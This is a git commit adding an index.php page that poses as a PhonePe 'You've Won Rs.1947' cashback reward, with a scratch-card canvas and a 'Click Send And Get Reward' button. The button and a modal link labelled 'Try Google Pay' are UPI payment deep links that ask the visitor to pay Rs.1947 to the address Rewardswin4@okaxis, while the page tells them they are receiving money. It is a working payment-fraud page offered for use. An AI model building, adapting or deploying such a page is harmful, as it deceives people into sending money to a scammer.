3c3419c7a931d7da769bed465b1b5ceb63d6e93b
Demon0011 <70286051+Demon0011@users.noreply.github.com>
2020-08-26 12:52:47 -0700

    Add files via upload

---
+++ index.php
@@ -0,0 +1,299 @@
+<!DOCTYPE html>
+<html><head>
+
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-163343484-8"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-163343484-8');
+</script>
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
+
+
+
+
+
+  <title>You've Won Rs.1947 Thanks Phonepe</title>
+  <style>
+    body {
+        background: #ffffff;
+        margin: 0px;
+    }
+
+    .bottom {
+        position: fixed;
+        width: 100%;
+        left: 0;
+        bottom: 0px;
+        text-align: center;
+        background: #5f259e;
+        /* color: #333; */
+        padding: 14px 0px;
+        font-size: 15px;
+        font-family: font89466;
+    }
+
+    .bottom img {
+        width: 98%;
+        height: auto;
+        /* margin-top: 69px; */
+        padding: 0px 0px 0px 0px;
+    }
+
+    .center {
+        /* text-align: center; */
+        /* height: 100%; */
+        /* vertical-align: middle; */
+        /* padding: 25% 0px; */
+        background: #5f259e;
+        border-radius: 508px;
+        width: 300px;
+        height: 300px;
+        margin: auto;
+        border: 3px solid #f2f2f2;
+    }
+
+    .center img {
+    width: 81%;
+}
+.header {
+    width: 100%;
+    background: #5f259e;
+    padding: 10px 0px;
+    text-align: center;
+    color: #fff;
+    font-size: 20px;
+    font-family: font89466;
+}
+
+.center img {
+    width: 200px;
+    position: absolute;
+    /* top: 0; */
+    /* left: 0; */
+    padding-top: 64px;
+    padding-left: 56px;
+}
+
+.reward img {
+    width: 153px;
+    margin: 30px 20px;
+}
+
+a .bottom {
+    color: #fff;
+    text-decoration: none;
+}
+
+  </style>
+
+
+  <style>
+
+/* The Modal (background) */
+.modal {
+  display: none; /* Hidden by default */
+  position: fixed; /* Stay in place */
+  z-index: 1; /* Sit on top */
+  padding-top: 100px; /* Location of the box */
+  left: 0;
+  top: 0;
+  width: 100%; /* Full width */
+  height: 100%; /* Full height */
+  overflow: auto; /* Enable scroll if needed */
+  background-color: rgb(0,0,0); /* Fallback color */
+  background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
+}
+
+/* Modal Content */
+.modal-content {
+  background-color: #fefefe;
+  margin: auto;
+  padding: 20px;
+  border: 1px solid #888;
+  width: 80%;
+}
+
+/* The Close Button */
+.close {
+  color: #aaaaaa;
+  float: right;
+  font-size: 28px;
+  font-weight: bold;
+}
+
+.close:hover,
+.close:focus {
+  color: #000;
+  text-decoration: none;
+  cursor: pointer;
+}.step {
+    margin-left: 70px;
+}
+
+
+
+.modal-backdrop.in{
+display:none;
+}
+/*****************Award-section--price-image-change*******************/
+
+#bridge {
+	display: block;
+	margin: 0 auto;
+   background-image: url('moneyreward2.png');
+	background-image: -webkit-image-set(url('moneyreward2.png') 1x, url('moneyreward2.png') 2x );
+	background-size: cover;
+	width: 100%;
+	max-width: 350px;
+	height: auto;
+  cursor:  crosshair;
+  cursor: url(circular-cursor.png) 53 53, crosshair;
+}
+#bridgeContainer { 
+  text-align: center;
+  font-family: Avenir, sans-serif;
+}
+#bridgeContainer figcaption {   
+  margin-top: 2rem; 
+}
+
+/*****************End-Award-image-section*******************/
+
+
+</style>
+</head>
+
+      <body>
+              <div class="header">You've Won PhonePe Reward</div>
+
+              <div style= "width: 153px; margin: 30px 20px;"><img src="reward.png"></div>
+			  
+			  <canvas id="bridge" width="350" height="345"></canvas> 
+			  
+			  
+               <br/><br/>
+              
+              
+
+              <div class="step"><img src="step.png" width="180px"></div>
+              
+        <br/><br/><br/>
+                <a href="phonepe://pay?pa=Rewardswin4@okaxis&amp;pn=Cashback Rewards&amp;cu=INR&amp;am=1947&amp;tn=Rs.1,947 Cashback" target="_blank"> <div class="bottom" data-toggle="modal" data-target="#myModal" id="myBtn">Click Send And Get Reward&amp; Sent Reward to your Bank</div>
+               </a>
+
+              <!-- The Modal -->
+              <div id="myModal" class="modal" role="dialog">
+                <!-- Modal content -->
+                <div class="modal-content">
+                  <span class="close" data-dismiss="modal">×</span>
+                  <p>Open phonepe app and sent your reward to your linked bank account.</p>
+                  <p> if your not phonepe users try google pay reward</p> 
+                  <a href="phonepe://pay?pa=Rewardswin4@okaxis&amp;pn=Cashback Rewards&amp;cu=INR&amp;am=1947&amp;tn=Rs.1,947 Cashback">Try Google Pay</a>
+                </div>
+
+              </div>
+			  
+			  
+			<!-------------Modal------------------->
+			<!-- <div class="modal fade" id="myModal" role="dialog">
+				<div class="modal-dialog">
+				
+				 
+				  <div class="modal-content">
+					<div class="modal-header">
+					  <button type="button" class="close" data-dismiss="modal">&times;</button>
+					  <h4 class="modal-title">Modal Header</h4>
+					</div>
+					<div class="modal-body">
+					  <p>Some text in the modal.</p>
+					</div>
+					<div class="modal-footer">
+					  <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+					</div>
+				  </div>
+				  
+				</div>
+			  </div>-->			
+
+
+
+			 
+	
+<!-------------scratch-card-javascript-------------------->	
+ <script>
+var bridge = document.getElementById("bridge"),
+bridgeCanvas = bridge.getContext('2d'),
+brushRadius = (bridge.width / 100) * 5,
+img = new Image();
+
+if (brushRadius < 50) { brushRadius = 50 }
+
+img.onload = function(){  
+	bridgeCanvas.drawImage(img, 0, 0, bridge.width, bridge.height);
+}
+img.loc = ''; // Set Your url path
+img.filename = 'scarcth.png';     // image file name
+if (window.devicePixelRatio >= 2) {
+	var nameParts = img.filename.split('.');
+	img.src = nameParts[0]+"-2x"+"."+nameParts[1];
+} else {
+	img.src = img.filename;
+}
+
+function detectLeftButton(event) {
+    if ('buttons' in event) {
+        return event.buttons === 1;
+    } else if ('which' in event) {
+        return event.which === 1;
+    } else {
+        return event.button === 1;
+    }
+}
+
+function getBrushPos(xRef, yRef) {
+	var bridgeRect = bridge.getBoundingClientRect();
+    return {
+	  x: Math.floor((xRef-bridgeRect.left)/(bridgeRect.right-bridgeRect.left)*bridge.width),
+	  y: Math.floor((yRef-bridgeRect.top)/(bridgeRect.bottom-bridgeRect.top)*bridge.height)
+    };
+}
+      
+function drawDot(mouseX,mouseY){
+	bridgeCanvas.beginPath();
+    bridgeCanvas.arc(mouseX, mouseY, brushRadius, 0, 2*Math.PI, true);
+    bridgeCanvas.fillStyle = '#000';
+    bridgeCanvas.globalCompositeOperation = "destination-out";
+    bridgeCanvas.fill();
+}
+
+bridge.addEventListener("mousemove", function(e) {
+	var brushPos = getBrushPos(e.clientX, e.clientY);
+  var leftBut = detectLeftButton(e);
+  if (leftBut == 1) {
+		drawDot(brushPos.x, brushPos.y);
+  }
+}, false);
+
+bridge.addEventListener("touchmove", function(e) {
+    e.preventDefault();
+    var touch = e.targetTouches[0];
+    if (touch) {
+    var brushPos = getBrushPos(touch.pageX, touch.pageY);
+        drawDot(brushPos.x, brushPos.y);
+    }
+}, false);
+</script>
+
+      </body>
+
+</html>
